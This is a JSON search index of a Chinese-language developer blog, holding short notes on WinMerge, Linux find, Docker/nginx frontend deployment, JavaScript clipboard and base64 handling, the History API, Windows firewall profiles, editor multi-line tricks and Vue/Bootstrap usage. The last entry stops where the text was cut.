[{"title":"Winmerge 比對技巧筆記","url":"%2Fblog%2F2021%2F07%2F24%2FWinmerge-%E6%AF%94%E5%B0%8D%E6%8A%80%E5%B7%A7%E7%AD%86%E8%A8%98%2F","content":"\n\n因為工作需求要專案檔案差異清單，要怎麼快速整理清單真的讓我想了一下。最後發現 Winmerge 就能做到簡單程式差異比對。\n\n<!--more-->\n\n## tree mode\n\n![](https://i.imgur.com/02dDsNJ.png)\n\n\n[merge - Get recursive list of different files in Winmerge (without folder tree/structure) - Super User](https://superuser.com/questions/300474/get-recursive-list-of-different-files-in-winmerge-without-folder-tree-structure)\n\n可以方便複製檔案清單。可跳過上層資料夾資料。\n\n## 開啟/關閉 顯示相同相目,顯示差異項目\n\n選擇「顯示相同項目」後，原本綠色的圖標會顯示/隱藏。這樣看檔案(附製檔案也很方便)。\n\n顯示差異項目也是跟上面差不多。\n\n![](https://i.imgur.com/dGcb1CJ.png)\n\n\n## command line \n\n未使用。\n\n[Command line - WinMerge 2.16 Manual](https://manual.winmerge.org/en/Command_line.html)\n\n## filter\n\nGUI 可以選擇要抓到項目。\n![](https://i.imgur.com/mvfM8zL.png)\n\n\n- [WinMerge: How to exclude *.bak and *.tmp files? - Super User](https://superuser.com/questions/726526/winmerge-how-to-exclude-bak-and-tmp-files)\n- [Using Filters - WinMerge 2.16 Manual](https://manual.winmerge.org/en/Filters.html)","tags":["winmerge"],"categories":["實用工具"]},{"title":"快速查詢多個檔案方法","url":"%2Fblog%2F2021%2F07%2F24%2F%E5%BF%AB%E9%80%9F%E6%9F%A5%E8%A9%A2%E5%A4%9A%E5%80%8B%E6%AA%94%E6%A1%88%E6%96%B9%E6%B3%95%2F","content":"\n# 快速查詢多個檔案方法\n\n簡單小記\n\n<!--more-->\n\n## find 查詢大法\n\n```\nfind */ -regex '.*UZ29564846.*\\|.*UZ02104919.*\\|.*UZ02605231.*\\|.*UZ02771129.*\\|.*UZ03128013.*\\|.*UZ03645989.*\\|.*UZ04195564.*\\|.*UZ04258665.*\\|.*UZ04572090.*\\|.*UZ04582332.*\\|.*UZ04795657.*\\|.*UZ04795658.*\\|.*UZ04805060.*\\|.*UZ04906998.*\\|.*UZ05422771.*\\|.*UZ05959297.*\\|.*UZ06513505.*\\|.*UZ06513808.*\\|.*UZ06557497.*\\|.*UZ06627631.*\\|.*UZ06844457.*\\|.*UZ06858381.*\\|.*UZ07690050.*\\|.*UZ07745374.*\\|.*UZ07973794.*\\|.*UZ08481252.*\\|.*UZ08483243.*\\|.*UZ08994865.*\\|.*UZ09219703.*\\|.*UZ09617909.*\\|.*UZ09744363.*\\|.*UZ10085340.*\\|.*UZ10147439.*\\|.*UZ10265614.*\\|.*UZ10349030.*\\|.*UZ11080689.*\\|.*UZ11113319.*\\|.*UZ11239587.*\\|.*UZ11340496.*\\|.*UZ11358240.*\\|.*UZ11369419.*\\|.*UZ11574001.*\\|.*UZ13383394.*\\|.*UZ12044029.*\\|.*UZ12052655.*\\|.*UZ12305719.*\\|.*UZ13379585.*\\|.*UZ12380320.*\\|.*UZ12512884.*\\|.*UZ13031886.*\\|.*UZ13178378.*\\|.*UZ13221862.*\\|.*UZ12812003.*\\|.*UZ12897804.*\\|.*UZ13218549.*\\|.*UZ13219157.*\\|.*UZ13740815.*\\|.*UZ13740852.*\\|.*UZ13813311.*\\|.*UZ13971437.*\\|.*UZ13991424.*\\|.*UZ14256642.*\\|.*UZ14325289.*\\|.*UZ14450802.*\\|.*UZ14490320.*\\|.*UZ14610042.*\\|.*UZ14629788.*\\|.*UZ14676668.*\\|.*UZ14725354.*\\|.*UZ14781828.*\\|.*UZ14847205.*\\|.*UZ15257774.*\\|.*UZ15368931.*\\|.*UZ15508841.*\\|.*UZ15715055.*\\|.*UZ16018567.*\\|.*UZ16265337.*\\|.*UZ16390441.*\\|.*UZ16515932.*\\|.*UZ16624108.*\\|.*UZ16746539.*\\|.*UZ17064104.*\\|.*UZ17324547.*\\|.*UZ17336391.*\\|.*UZ20836990.*\\|.*UZ22806918.*\\|.*UZ23183708.*\\|.*UZ24312875.*\\|.*UZ24380058.*\\|.*UZ24602016.*'\n```\n\n[regex match either string in linux \"find\" command - Stack Overflow](https://stackoverflow.com/questions/19111067/regex-match-either-string-in-linux-find-command)\n\n之前就有記錄相關 find 指令，但每次都忘了差不多怎麼用...，不過有整理筆記的好處，可以方便找出來。\n\n## globstar 大法\n\n跟find 差不多...，但好像也沒有比較方便。\n\n\n\n## 直接找 zip 檔案內容\n\n- [Linux find 實用指令筆記 | 程式狂想筆記](https://malagege.github.io/blog/2018/08/18/Linux-find-%E5%AF%A6%E7%94%A8%E6%8C%87%E4%BB%A4%E7%AD%86%E8%A8%98/)\n- [linux bash / shell 有關 * 星號的事情 | 程式狂想筆記](https://malagege.github.io/blog/2020/01/21/linux-bash-shell-%E6%9C%89%E9%97%9C-%E6%98%9F%E8%99%9F%E7%9A%84%E4%BA%8B%E6%83%85/)\n\n\n\n\n\n\n[How can I view the contents of tar.gz file without extracting from the command-line? - Ask Ubuntu](https://askubuntu.com/questions/392885/how-can-i-view-the-contents-of-tar-gz-file-without-extracting-from-the-command-l)\n[linux - How to find the string in the list of .gz files? - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/515569/how-to-find-the-string-in-the-list-of-gz-files)\n\n\n\n\n\n\n[查詢有壓縮(gz)日誌 log 方法 | 程式狂想筆記](https://malagege.github.io/blog/2021/01/17/%E6%9F%A5%E8%A9%A2%E6%9C%89%E5%A3%93%E7%B8%AE-gz-%E6%97%A5%E8%AA%8C-log-%E6%96%B9%E6%B3%95/)\n\n\nhttps://ideone.com/7nbElh","tags":["linux"],"categories":["Linux"]},{"title":"簡單用 Docker 部屬前端程式 nginx","url":"%2Fblog%2F2021%2F07%2F24%2F%E7%B0%A1%E5%96%AE%E7%94%A8-Docker-%E9%83%A8%E5%B1%AC%E5%89%8D%E7%AB%AF%E7%A8%8B%E5%BC%8F-nginx%2F","content":"\n# 簡單用 Docker 部屬前端程式 nginx\n\n之前這篇[Vue Router 4 學習筆記 | 程式狂想筆記](https://malagege.github.io/blog/2021/06/27/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/#%E4%BC%BA%E6%9C%8D%E5%99%A8%E9%85%8D%E7%BD%AE)有記錄到要怎麼使用 nginx，今天就簡單實作看看。\n\n<!--more-->\n\n## 取得 nginx.conf 設定檔\n\n可參考:[Nginx - Official Image | Docker Hub](https://hub.docker.com/_/nginx)\n```bash=\ndocker run --name tmp-nginx-container -d nginx\ndocker cp tmp-nginx-container:/etc/nginx/nginx.conf /host/path/nginx.conf\ndocker rm -f tmp-nginx-container\n```\n\n我以前有有寫過[抓出 Docker 裡面檔案設定檔出來 | 程式狂想筆記](https://malagege.github.io/blog/2021/04/15/%E6%8A%93%E5%87%BA-Docker-%E8%A3%A1%E9%9D%A2%E6%AA%94%E6%A1%88%E8%A8%AD%E5%AE%9A%E6%AA%94%E5%87%BA%E4%BE%86/)，但久久沒用就忘記差不多...\n\n\n## 前端設定\n\n加在 nginx.conf 上面。\n\n```\nlocation / {\n  try_files $uri $uri/ /index.html;\n}\n\n```\n\n要補上 `server` ，要放在 http 裡面。\n![](https://i.imgur.com/yWFaaCs.png)\n\n```\n    server{\n      listen 80;\n      location / {\n        root /usr/share/nginx/html;\n        try_files $uri $uri/ /index.html;\n      }\n    }\n\n\n```\n\n參考:[不同的历史模式 | Vue Router](https://next.router.vuejs.org/zh/guide/essentials/history-mode.html#apache)\n\n\n## Docker volume 掛載設定\n\n```bash=\ndocker run --rm -v $(pwd)/dist:/usr/share/nginx/html:ro -v $(pwd)/nginx.conf:/etc/nginx/nginx.conf:ro -p 3355:80 nginx\n\n```\n\n可以跑的話再設定\n\n[nginx 基礎設定教學](https://blog.hellojcc.tw/nginx-beginner-tutorial/)\n\n## 設定 docker-compose\n\n加上 traefik 設定\n\n```yaml=\nversion: \"2\"\n\nservices:\n  strTemplateTest:\n    image: nginx\n    volumes:\n        - ./dist/:/usr/share/nginx/html\n        - ./nginx.conf:/etc/nginx/nginx.conf\n        - /etc/localtime:/etc/localtime:ro\n    networks:\n        - traefik_network\n    restart: always\n\n    labels:\n      - \"traefik.http.routers.strTemplateTest.rule=Host(`strTemplateTest.xxxx.org`)\"\n      - \"traefik.http.routers.strTemplateTest.tls=true\"\nnetworks:\n  traefik_network:\n    external: true\n\n```\n\n\n## 之後...\n\n之後研究 Drone CI 會研究怎麼 build dockerfile，然後自動化部屬。之後再說，顆顆。","tags":["fronted"],"categories":["Docker"]},{"title":"網頁複製文字研究整理","url":"%2Fblog%2F2021%2F07%2F24%2F%E7%B6%B2%E9%A0%81%E8%A4%87%E8%A3%BD%E6%96%87%E5%AD%97%E7%A0%94%E7%A9%B6%E6%95%B4%E7%90%86%2F","content":"\n# 網頁複製文字研究整理\n\n常用這個功能，我都網路 Google 找解答，今天又去爬了一次，就順便整理一下。\n\n<!--more-->\n\n## 以前常用寫法\n\n[前端開發：如何使用Javascript實現複製到剪貼簿的功能 - Astral Web 歐斯瑞有限公司](https://www.astralweb.com.tw/frontend-development-how-to-use-javascript-to-copy-text-to-clipboard/)\n\n```javascript=\nfunction copyText() {\n    var node = document.getElementById(\"text\");\n    if (document.body.createTextRange) {\n        var range = document.body.createTextRange();\n        range.moveToElementText(node);\n        range.select();\n        document.execCommand(\"copy\");\n        alert(\"複製成功!\");\n    } else if (window.getSelection) {\n        var selection = window.getSelection();\n        var range = document.createRange();\n        range.selectNodeContents(node);\n        selection.removeAllRanges();\n        selection.addRange(range);\n        document.execCommand(\"copy\");\n        alert(\"複製成功!\");\n    } else {\n        alert('無法複製內容、瀏覽器不支援');       \n    }\n}\n```\n\n[自動選取某個區域的文字 - OXXO.STUDIO](https://www.oxxostudio.tw/articles/201508/select-text.html)\n\n\n## Clipboard API\n\n[How do I copy to the clipboard in JavaScript? - Stack Overflow](https://stackoverflow.com/questions/400212/how-do-i-copy-to-the-clipboard-in-javascript/30810322#30810322)，這篇有很多留實做方法，這邊有看到有人用到 HTML5 Clipboard API。\n\n```javascript=\nvar text = \"Example text to appear on clipboard\";\nnavigator.clipboard.writeText(text).then(function() {\n  console.log('Async: Copying to clipboard was successful!');\n}, function(err) {\n  console.error('Async: Could not copy text: ', err);\n});\n```\n\n注意，這邊不能在 console.log  下，因為會無效。(原因:Clipboard write was blocked due to lack of user activation.)，需要使用者操做才能有效。\n\n[Clipboard API 實做測試](https://jsbin.com/nahacejevo/edit?html,js,output)\n\n[Clipboard Test](https://deanmarktaylor.github.io/clipboard-test/)\n\n### 復製圖片法\n\n\n[Unblocking clipboard access](https://web.dev/async-clipboard/)這篇有教，但先不研究。目前知道Firefox 貼上只能用在文字上面，圖片目前還不行。\n\n[Async Clipboard API Image Demo](https://async-clipboard-api.glitch.me/)\n\n## 相關 API 文件\n\n[Clipboard.writeText() - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/Clipboard/writeText) 複製用的。\n\n[Permissions API - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/Permissions_API)，權限控制。\n\n[TextRange - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/TextRange) 以廢棄，不推薦使用\n\n[Selection - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/Selection)，這個是框選用的API。仔細看發現還滿簡單的。\n\n```javascript=\nvar selObj = window.getSelection();\nvar range  = selObj.getRangeAt(0);\n```","tags":["web"],"categories":["Web"]},{"title":"JavaScript atob 轉 base64時候處理中文方法","url":"%2Fblog%2F2021%2F07%2F24%2FJavaScript-atob-%E8%BD%89-base64%E6%99%82%E5%80%99%E8%99%95%E7%90%86%E4%B8%AD%E6%96%87%E6%96%B9%E6%B3%95%2F","content":"\n# JavaScript atob 轉 base64時候處理中文方法\n\n我以前一直以為轉 base64 一定都要透過套件來完成，但某一年我看到 JS 也能直接轉 base64(用atob)，我一直以為很完美，直到我今天轉到中文就轉不過了...\n\n<!--more-->\n\n## 開門見山，直接整理網路上解法\n\n- [JavaScript atob / btoa 編解碼不支援 utf8 的解決方案 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10229587)\n- [解決 Javascript 中 atob 方法解碼中文字符亂碼問題 - CODING 博客](https://blog.coding.net/blog/resolve-atob-decode-chinese-character-outputting-messy-code-problem-in-javascript)\n- [btoa(), atob() 支援中文的方法 | Liullen dev daily](https://nelluil.postach.io/post/btoa-atob-zhi-yuan-zhong-wen-de-fang-fa)\n- [原来浏览器原生支持JS Base64编码解码 « 张鑫旭-鑫空间-鑫生活](https://www.zhangxinxu.com/wordpress/2018/08/js-base64-atob-btoa-encode-decode/)\n\n### atob/btoa???\n\n> 由於一些網絡通訊協議的限制,你必須使用 window.btoa() 方法對原數據進行編碼後，才能進行發送。接收方使用相當於 window.atob() 的方法對接受到的 base64 數據進行解碼,得到原數據。例如，發送某些含有 ASCII 碼表中 0 到 31 之間的控制字符的數據。\n參考:[解決 Javascript 中 atob 方法解碼中文字符亂碼問題 - CODING 博客](https://blog.coding.net/blog/resolve-atob-decode-chinese-character-outputting-messy-code-problem-in-javascript)\n\n> 记住btoa方法\nbtoa这个方法名称乍一看，很奇怪，不知道这个单词什么意思。我们可以理解为 B to A，也就是从B到A。那B指什么，A指什么呢？和atob方法一样，B指的是low B普通字符串，A指的是Base64字符。\n> 因此，btoa方法表示low B普通字符to Base64字符，也就是Base64编码。\n參考:[原来浏览器原生支持JS Base64编码解码 « 张鑫旭-鑫空间-鑫生活](https://www.zhangxinxu.com/wordpress/2018/08/js-base64-atob-btoa-encode-decode/)\n\n我一直看不太懂 function 為什麼取這樣....\n\n### encodeURIComponent\n\n```javascript=\nfunction utf8_to_b64( str ) {\n    return window.btoa(encodeURIComponent( escape( str )));\n}\n\nfunction b64_to_utf8( str ) {\n    return unescape(decodeURIComponent(window.atob( str )));\n}\n```\n\n雖然有猜到會用 `encodeURIComponent`，之前 fabar.js 有用到這個處理中文，但是沒有想到 escape / unescape ，這邊不知道有甚麼作用。前端串前端推薦使用，但不是和對外接口或是後湍操作，測試結果會比較長。\n[Base64 encode/decode online](https://www.utilities-online.info/base64)網站測試無法解\n\n\n### 第三方套件\n\n[Javascript base64 - Javascript tutorial with example source code](http://www.webtoolkit.info/javascript-base64.html)\n\n[Base64 encode/decode online](https://www.utilities-online.info/base64)網站測試可以解\n\n上面 ESM 會有問題，所以我改用[dankogai/js-base64: Base64 implementation for JavaScript](https://github.com/dankogai/js-base64)\n\n### MDN 解法\n\n```javascript=\n// convert a Unicode string to a string in which\n// each 16-bit unit occupies only one byte\nfunction toBinary(string) {\n  const codeUnits = new Uint16Array(string.length);\n  for (let i = 0; i < codeUnits.length; i++) {\n    codeUnits[i] = string.charCodeAt(i);\n  }\n  return String.fromCharCode(...new Uint8Array(codeUnits.buffer));\n}\n\n// a string that contains characters occupying > 1 byte\nconst myString = \"☸☹☺☻☼☾☿\";\n\nconst converted = toBinary(myString);\nconst encoded = btoa(converted);\nconsole.log(encoded);                 // OCY5JjomOyY8Jj4mPyY=\n\n```\n\n[Base64 encode/decode online](https://www.utilities-online.info/base64)網站測試可以解\n\n## 總結\n\n自己用的話可以看用哪一個，但對外串接還是用 第三方套件，後端串才不會有問題。","tags":["base64"],"categories":["JavaScript"]},{"title":"HTML5 History API 筆記","url":"%2Fblog%2F2021%2F07%2F24%2FHTML5-History-API-%E7%AD%86%E8%A8%98%2F","content":"\n\n參考:[操控瀏覽器歷史紀錄 - Web APIs | MDN](https://developer.mozilla.org/zh-TW/docs/Web/API/History_API)\n\n### 上/下一頁API\n\n> 往前往後歷史紀錄可以用 back(), forward(), 和 go() 的方法。\n\n\n```javascript=\nwindow.history.back();\nwindow.history.forward();\n```\n\n### 移置特定頁面\n\n> 移動到特定的歷史紀錄\n> \n> 你可以用 go() 方法來從頁面的 session history 紀錄中載入特定紀錄，以目前頁面的相對位置而定（目前的頁面想當然爾是 index 0）。\n\n```javascript=\nwindow.history.go(-1);\nwindow.history.go(1);\n\n```\n\n### 其它\n\n```javascript=\nvar numberOfEntries = window.history.length;\n```\n\n## 加入和修改歷史紀錄\n\n\n### pushState() 方法範例\n\n```javascript=\nvar stateObj = { foo: \"bar\" };\nhistory.pushState(stateObj, \"page 2\", \"bar.html\");\n\n```\n\n\n### replaceState() 方法\n\n```\nvar stateObj = { foo: \"bar\" };\nhistory.replaceState(stateObj, \"page 2\", \"bar.html\");\n```\n\n\n### popstate 事件\n\n```javascript=\nwindow.onpopstate = function(event) {\n  alert(\"location: \" + document.location + \", state: \" + JSON.stringify(event.state));\n};\n\nhistory.pushState({page: 1}, \"title 1\", \"?page=1\");\nhistory.pushState({page: 2}, \"title 2\", \"?page=2\");\nhistory.replaceState({page: 3}, \"title 3\", \"?page=3\");\nhistory.back(); // alerts \"location: http://example.com/example.html?page=1, state: {\"page\":1}\"\nhistory.back(); // alerts \"location: http://example.com/example.html, state: null\nhistory.go(2);  // alerts \"location: http://example.com/example.html?page=3, state: {\"page\":3}\n```\n\n這邊可以看到，第一頁面，state是`null`，replaceState跟 location.replace 很像，上下一頁不會取代掉\n\n\n\n## 小記\n\n一開始我以為 HTML5 History API 很難，但是看 `popstate 事件`，我就恍然大悟，大概知道要怎麼使用。簡單來說跟`location.href` 很像，但可以帶 `state`和 改變 URL。透過`popstate 事件` 去操作畫面。\n\n這邊看到還滿有趣的範例:[重新認識 JavaScript 番外篇 (2) - 你所不知道的 pushState - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10195793)","tags":["history"],"categories":["HTML"]},{"title":"Window 防火牆設定完成無法連通的問題","url":"%2Fblog%2F2021%2F07%2F17%2FWindow-%E9%98%B2%E7%81%AB%E7%89%86%E8%A8%AD%E5%AE%9A%E5%AE%8C%E6%88%90%E7%84%A1%E6%B3%95%E8%81%AF%E9%80%9A%E7%9A%84%E5%95%8F%E9%A1%8C%2F","content":"\n我這台電腦 hfs 無法對外連線，有設定開通防火牆，一直找不出什麼問題。最近看了[Docker Desktop for Windows 啟動的容器無法透過遠端連接的靈異事件簿 | The Will Will Web](https://blog.miniasp.com/post/2021/06/14/Docker-Desktop-for-Windows-Windows-Firewall-Issues)，嘗試著調整防火牆，別台電腦終於可以連了。\n\n雖然保哥紀錄已經夠完整了，建議可以看上面文章，這邊還是紀錄我的筆記。\n\n<!--more-->\n\n\n## 了解 Window 私有網路/共用網路\n\n什麼是私有網路/共用網路，共用網路在網路芳鄰不會被探索到。私有網路是在家裡讓網路芳鄰可以連到，這邊就不深入探索這些有什麼功能。\n\n怎麼看現在網路用什麼位置?\n使用 Powershell 看\n```\nGet-NetConnectionProfile\n```\n\n\n```\nName             : 網路  2\nInterfaceAlias   : nMatrix Virtual Network\nInterfaceIndex   : 10\nNetworkCategory  : Public\nIPv4Connectivity : LocalNetwork\nIPv6Connectivity : NoTraffic\n\nName             : CHTXXX\nInterfaceAlias   : 區域連線\nInterfaceIndex   : 29\nNetworkCategory  : Public\nIPv4Connectivity : Internet\nIPv6Connectivity : NoTraffic\n```\n\n這邊可以看到我是使用共用網路，所以網路芳鄰是找不到的。\n上面保哥有特別說，正常在家會想分享網路芳鄰，可能就要開私有網路。在外面要連 Wifi 的話，可以使用共用網路，可以看情況選擇。\n\n### 切換共用網路/私有網路\n\n```powershell\n# 私有網路\nSet-NetConnectionProfile -Name \"CHTXXX\" -NetworkCategory Private\n# 共用網路\nSet-NetConnectionProfile -Name \"CHTXXX\" -NetworkCategory Public\n```\n\n這邊假如你切換網路能跑了，但問題不是出在這邊，你可以往下在看下去是甚麼原因。\n\n## 了解防火牆 取消後發生的事情\n\n一般第一次打開應用程式，如 hfs 會跳出防火牆圖示，如下。\n\n{% asset_img img1.png 防火牆 %}\n\n我們按下「取消」，然後看到防火牆規則\n\n{% asset_img img2.png 防火牆 %}\n\n竟然防火牆規則都是「封鎖」的(私有/共用網路)，然後你打開 hfs 軟體就無法選擇防火牆規則，因為都已經設定封鎖。\n\n簡單做個這個防火牆會發生什麼事情\n\n## 最後整理\n\n{% asset_img img1.png 防火牆 %}\n\n上面有那個選擇，就是對私有網路看共用網路做允許或封鎖設定。\n\n1. 假如你取消，就是私有網路、共用網路做封鎖。\n2. 假如你勾選私有網路，那就是私有網路做允許，共用網路做封鎖。\n3. 假如你勾選共用網路，那就是共用網路做允許，私有網路做封鎖。\n4. 假如全勾，就是私有網路、共用網路做允許。\n\n## 總結\n\n首先，為什麼要知道當前網路是在私有網路/共用網路？因為在看防火牆規則才知道哪一個有效的。\n再來就是看當前網路下，防火牆是否開通。\n\n結案:D\n\n## 指令小記\n\nposershell 查詢防火牆規則\n```\nGet-NetFirewallRule | where { $_.Name -like \"*hfs*\" } | ft\n```\n\n開啟防火牆 cmd `wf.msc`","tags":["firewall"],"categories":["Window"]},{"title":"用 Sublime 分割 SQL 語句 LIKE 1000筆資料 語句","url":"%2Fblog%2F2021%2F07%2F14%2F%E7%94%A8-Sublime-%E5%88%86%E5%89%B2-SQL-%E8%AA%9E%E5%8F%A5-LIKE-1000%E7%AD%86%E8%B3%87%E6%96%99-%E8%AA%9E%E5%8F%A5%2F","content":"\nOralce 有限制 Like 不能超過 1000 多筆。之前有寫過相關文章如下\n\n1. [寫程式使用 split 切割不會注意到的陷阱 | 程式狂想筆記](https://malagege.github.io/blog/2020/10/28/%E5%AF%AB%E7%A8%8B%E5%BC%8F%E4%BD%BF%E7%94%A8-split-%E5%88%87%E5%89%B2%E4%B8%8D%E6%9C%83%E6%B3%A8%E6%84%8F%E5%88%B0%E7%9A%84%E9%99%B7%E9%98%B1/)\n2. [Oracle WHERE IN 條件塞入超過 500 筆查詢條件方法 | 程式狂想筆記](https://malagege.github.io/blog/2021/01/12/Oracle-WHERE-IN-%E6%A2%9D%E4%BB%B6%E5%A1%9E%E5%85%A5%E8%B6%85%E9%81%8E-500-%E7%AD%86%E6%9F%A5%E8%A9%A2%E6%A2%9D%E4%BB%B6%E6%96%B9%E6%B3%95/)\n\n但這些虛要手動處理太多，不能一次喝成，有時候資料量真的太大，只能分開查。最近想到 Sublime Text 方法，簡單做個記錄。\n還是需要滿多步驟\n\n<!--more-->\n\n## DEMO 範例\n\n```\n'這是第 1 行',\n'這是第 2 行',\n'這是第 3 行',\n'這是第 4 行',\n\n```\n\n注意：上面有五行，因為 regex 需要多一行。\n\n### 例外處理\n\n假如框選最後一行，只框選一行。就要多做一個換行\n如下：\n\n{% asset_img EZ9AfmU.png title %}\n\n## 產生方法\n\n1. 在 Sublime 使用 regex `((.*\\n){1,3})`\n\n{% asset_img XQvraNs.png 1 %}\n\n\n2. 選擇 Find all 按鈕\n\n{% asset_img eSl1lCW.png 2 %}\n\n\n3. 按 「Shift + 方向鍵左(←)」 後，再按「Shift + 方向鍵左(↑)」\n\n{% asset_img AW4FHWp.png 3 %}\n\n4. Ctrl + J ，按完就完成兩段句子，最後一行可刪掉\n\n5. 複製兩段 LIKE SQL 語句，中間替代參數也要先設定\n\n{% asset_img faRy4L8.png 5 %}\n\n\n6. 全部框選`:id:` Ctrl + D，把1,2行複製起來，貼上即可完成\n\n{% asset_img uhqhXg0.png 6-1 %}\n{% asset_img n3a9Ou7.png 6-2 %}\n{% asset_img yY1rw1h.png 6-3 %}\n\n7. 把最後`,`移除\n\n\n就可以快樂貼到編輯器查詢。\n\n\n## 缺點\n\n真的行數到超多筆的話，這個方法應該也沒辦法。\n\n其實這個可以用程式寫，有空寫在補在這。","tags":["sublime"],"categories":["實用工具"]},{"title":"實驗 Sublime Text 和 vscode 框選多行貼上","url":"%2Fblog%2F2021%2F07%2F14%2F%E5%AF%A6%E9%A9%97-Sublime-Text-%E5%92%8C-vscode-%E6%A1%86%E9%81%B8%E5%A4%9A%E8%A1%8C%E8%B2%BC%E4%B8%8A%2F","content":"\n最近要做 SQL 語句 LIKE 超過 1000 筆，就無法執行。我想透過 Sublime Text 方式去做出來，還踩了一個雷。這個雷是這樣的，我框選 1000 筆(1筆含多行)，貼到我要貼得1000多行，結果貼上超過 1000 多筆資料。\n\n當然簡單研究結果，找出到原因。原因很簡單，就是換行的問題\n\n\n<!--more-->\n\nSublime Text 和 vscode 都是一樣結果\n\n## 正規表達式抓到 多行方法\n\n```\n((.*\\n){1,100})\n```\n參考: [sublimetext2 - multiple selection every N lines Sublime Text - Stack Overflow](https://stackoverflow.com/questions/25609050/multiple-selection-every-n-lines-sublime-text)\n\n稍微優化\n\n```\n(?:(.*\\n){1,100})\n```\n\n參考:[regex - What is a non-capturing group in regular expressions? - Stack Overflow](https://stackoverflow.com/questions/3512471/what-is-a-non-capturing-group-in-regular-expressions)\n\n### 無法預期\n\n這邊我們抓到資料 100 行資料貼到別的 100 列資料卻無法預期貼上結果。\n\n我們框選內容\n{% asset_img OAmJLzq.png 我們框選內容 %}\n\n貼上結果\n{% asset_img DhevCDE.png 貼上結果 %}\n\n### 原因\n\n雖然Ctrl + D 框選資料可以包含換行，但是貼上分段式依照換行去變得。直接貼上我實驗的圖片\n\n框選內容:\n{% asset_img habK4wk.png 框選內容 %}\n\n結果:\n貼上結果前\n{% asset_img Mem7p4z.png 貼上結果前 %}\n貼上結果後\n{% asset_img RQ4yVad.png 貼上結果後 %}\n\n","tags":["skill"],"categories":["實用工具"]},{"title":"Vite 使用 Bootstrap 5","url":"%2Fblog%2F2021%2F07%2F14%2FVite-%E4%BD%BF%E7%94%A8-Bootstrap-5%2F","content":"\n使用小記\n\n<!--more-->\n\n前置 Vite 專案不寫了\n\n## 安裝 Bootstrap 5\n\n\n```bash=\nnpm install bootstrap -D\n\nnpm i @popperjs/core -D\n```\n\n## 設定 main.js\n\n```\nimport \"bootstrap/dist/css/bootstrap.min.css\"\nimport 'bootstrap'\n```\n\nGIT: [cf95a316b4a8fd73621040a135d41cfc304de780](https://github.com/malagege/strTemplate-test/commit/cf95a316b4a8fd73621040a135d41cfc304de780)\n\n\n完成\n\n\n","tags":["boostrap"],"categories":["Vue"]},{"title":"Vue computed 無法觸發原因","url":"%2Fblog%2F2021%2F07%2F14%2Fvue-computed-%E7%84%A1%E6%B3%95%E8%A7%B8%E7%99%BC%E5%8E%9F%E5%9B%A0%2F","content":"\n\n> view 或者 methods 中有没有用到 pages，如果没有用到，那么是不会触发 computed 的\n\n- [【VUE】当依赖属性改变时，computed为何没有被触发? - SegmentFault 思否](https://segmentfault.com/q/1010000020845026/)\n- [那些關於 Vue 的小細節 - Computed 中 getter 和 setter 觸發的時間點 ~ PJCHENder 那些沒告訴你的小細節](https://pjchender.blogspot.com/2017/05/vue-computed-getter-setter.html)這篇詳細講了 getter 和 setter 實作，簡單來說 view 或 methods執行 沒有用到 computed 的屬性，就不會執行 getter 資料，所以就無法執行!\n\n<!--more-->\n\n\n因為這篇採雷了，也許我們要分析什麼時候用到 computed。我剛好用 monaco-editor ，此套件沒有用到 Vue 程式，所以沒辦法用到 data Binding 去做綁定，但是我用 Event 去觸發改 Vue 的值，也許應該要獨立把它包成 Vue 套件。目前 Vue3 測試階段，套件沒有支援 Vue3。\n\n仔細回去看官網那篇文件[计算属性和侦听器 | Vue.js](https://v3.cn.vuejs.org/guide/computed.html)，真的是用在 View 的值，我當初以為 computed 裡面屬性裡面的值是因為偵測 function 裡面變數，但看來是我想太多，原理就是 getter。\n\n這篇就記錄到這邊，因為這麼簡單原理，我卡了幾小時的關，不過最後也還債了...\n\n\n小記:\n想使用外部存js 元件有甚麼方法?\n我這邊自己想的方向有:\n\n1. 寫在 method 直接觸發 function\n2. data binding\n\n","tags":["vue"],"categories":["Vue"]},{"title":"Vue 使用綁定 class  筆記","url":"%2Fblog%2F2021%2F07%2F14%2FVue-%E4%BD%BF%E7%94%A8%E7%B6%81%E5%AE%9A-class-%E7%AD%86%E8%A8%98%2F","content":"\n\n在使用 Bootstrap 會用到 Navbar 選單，做到動態選單時候會用到 isActive，要怎麼透過 Vue 綁定到 class 上面?照官方實作可以簡單完成。\n\n\n<!--more-->\n\n## 需求解法\n\n```htmlembedded=\n                <li class=\"nav-item\">\n                  <a class=\"nav-link\" :class=\"{active: mode === 'edit'}\" aria-current=\"page\" href=\"javascript:;\" @click=\"mode = 'edit'\">編輯</a>\n                </li>\n                <li class=\"nav-item\">\n                  <a class=\"nav-link\" :class=\"{active: mode === 'result'}\" href=\"javascript:;\" @click=\"mode = 'result'\">結果</a>\n                </li>\n```\n\n```javascript=\nexport default {\n  data(){\n    return {\n      mode: 'edit',\n    }\n  },\n```\n\n## 綁定 HTML Class\n\n\n### 物件語法\n\n```htmlembedded=\n<div :class=\"{ active: isActive }\"></div>\n```\n\n## 靜態與動態 Class 結合\n\n```htmlembedded=\n<div\n  class=\"static\"\n  :class=\"{ active: isActive, 'text-danger': hasError }\"\n></div>\n\n```\n\n```javascript=\ndata() {\n  return {\n    isActive: true,\n    hasError: false\n  }\n}\n\n```\n\n結果\n\n```htmlembedded=\n<div class=\"static active\"></div>\n```\n\n### 搭配 computed\n\n```htmlembedded=\n<div :class=\"classObject\"></div>\n```\n\n\n```javascript=\ndata() {\n  return {\n    isActive: true,\n    error: null\n  }\n},\ncomputed: {\n  classObject() {\n    return {\n      active: this.isActive && !this.error,\n      'text-danger': this.error && this.error.type === 'fatal'\n    }\n  }\n}\n\n```\n\n## 陣列語法\n\n```htmlembedded=\n<div :class=\"[activeClass, errorClass]\"></div>\n\n```\n\n```javascript=\ndata() {\n  return {\n    activeClass: 'active',\n    errorClass: 'text-danger'\n  }\n}\n\n```\n\nresult: \n```javascript=\n<div class=\"active text-danger\"></div>\n```\n\n## 